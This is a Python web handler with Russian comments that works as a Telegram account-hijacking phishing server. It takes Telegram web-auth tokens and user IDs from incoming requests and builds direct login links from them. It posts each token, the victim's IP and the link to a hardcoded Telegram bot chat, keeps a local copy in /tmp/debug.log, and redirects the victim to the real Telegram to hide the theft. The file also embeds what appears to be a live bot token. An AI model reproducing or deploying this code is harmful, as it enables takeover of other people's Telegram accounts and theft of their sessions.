from http.server import BaseHTTPRequestHandler
import urllib.parse
import requests
from datetime import datetime
import json

# ========== ТВОИ ДАННЫЕ ==========
BOT_TOKEN = "8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4"
CHAT_ID = "8220267007"

class handler(BaseHTTPRequestHandler):
    
    def log_message(self, msg):
        """Переопределяем логирование"""
        print(msg)
    
    def do_GET(self):
        """Обработка GET запросов"""
        try:
            # Логируем ВСЕ запросы
            print(f"\n{'='*50}")
            print(f"🚀 НОВЫЙ ЗАПРОС: {datetime.now().isoformat()}")
            print(f"📌 ПУТЬ: {self.path}")
            print(f"📡 ЗАГОЛОВКИ: {dict(self.headers)}")
            
            # Парсим URL и параметры
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Извлекаем параметры Telegram
            token = params.get('tgWebAuthToken', [''])[0]
            user_id = params.get('tgWebAuthUserId', [''])[0]
            dc_id = params.get('tgWebAuthDcId', ['2'])[0]
            
            # Получаем реальный IP
            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            
            # Логируем полученные данные
            print(f"\n📦 ПОЛУЧЕННЫЕ ДАННЫЕ:")
            print(f"   🔑 Токен: {token if token else 'НЕТ'}")
            print(f"   👤 User ID: {user_id if user_id else 'НЕТ'}")
            print(f"   🌐 DC: {dc_id}")
            print(f"   📱 IP: {ip}")
            
            # ЕСЛИ ЕСТЬ ТОКЕН - ОТПРАВЛЯЕМ В TELEGRAM
            if token and user_id:
                print(f"\n📤 ОТПРАВКА В TELEGRAM...")
                
                # Формируем ссылку для входа
                login_url = f"https://web.telegram.org/k/#tgWebAuthToken={token}&tgWebAuthUserId={user_id}&tgWebAuthDcId={dc_id}"
                
                # Сокращаем ссылку (опционально)
                try:
                    short_url = requests.get(f"https://clck.ru/--?url={login_url}", timeout=3).text
                except:
                    short_url = login_url
                
                # Формируем сообщение
                message = (
                    f"🔥 <b>НОВЫЙ АККАУНТ!</b>\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
                    f"🔑 <b>Token:</b> <code>{token}</code>\n"
                    f"🌐 <b>DC:</b> {dc_id}\n"
                    f"📱 <b>IP:</b> <code>{ip}</code>\n"
                    f"🕐 <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"🔗 <b>ССЫЛКА ДЛЯ ВХОДА:</b>\n"
                    f"<code>{login_url}</code>\n\n"
                    f"📌 <b>Сокращенная:</b>\n"
                    f"{short_url}"
                )
                
                # Отправляем в Telegram
                try:
                    response = requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={
                            "chat_id": CHAT_ID,
                            "text": message,
                            "parse_mode": "HTML",
                            "disable_web_page_preview": False
                        },
                        timeout=10
                    )
                    
                    print(f"   ✅ Статус: {response.status_code}")
                    if response.status_code == 200:
                        print(f"   ✅ УСПЕШНО ОТПРАВЛЕНО!")
                    else:
                        print(f"   ❌ Ошибка: {response.text}")
                        
                except Exception as e:
                    print(f"   ❌ Ошибка отправки: {str(e)}")
            else:
                print(f"\n⚠️ НЕТ ТОКЕНА - пропускаем отправку")
            
            # СОХРАНЯЕМ В ЛОКАЛЬНЫЙ ФАЙЛ (для отладки)
            try:
                log_entry = {
                    "time": datetime.now().isoformat(),
                    "path": self.path,
                    "token": token,
                    "user_id": user_id,
                    "dc_id": dc_id,
                    "ip": ip,
                    "headers": dict(self.headers)
                }
                with open('/tmp/debug.log', 'a') as f:
                    f.write(json.dumps(log_entry) + '\n')
                print(f"📝 Сохранено в /tmp/debug.log")
            except Exception as e:
                print(f"⚠️ Не удалось сохранить лог: {e}")
            
            # РЕДИРЕКТ НА НАСТОЯЩИЙ TELEGRAM
            print(f"\n↩️ РЕДИРЕКТ на web.telegram.org")
            self.send_response(302)
            self.send_header('Location', 'https://web.telegram.org/k/')
            self.end_headers()
            
        except Exception as e:
            print(f"\n💥 КРИТИЧЕСКАЯ ОШИБКА: {str(e)}")
            # Даже при ошибке редиректим
            self.send_response(302)
            self.send_header('Location', 'https://web.telegram.org/k/')
            self.end_headers()
    
    def do_POST(self):
        """Обработка POST запросов"""
        self.do_GET()

# Для локального тестирования
if __name__ == '__main__':
    from http.server import HTTPServer
    server = HTTPServer(('localhost', 8000), handler)
    print('Сервер запущен на http://localhost:8000')
    server.serve_forever()
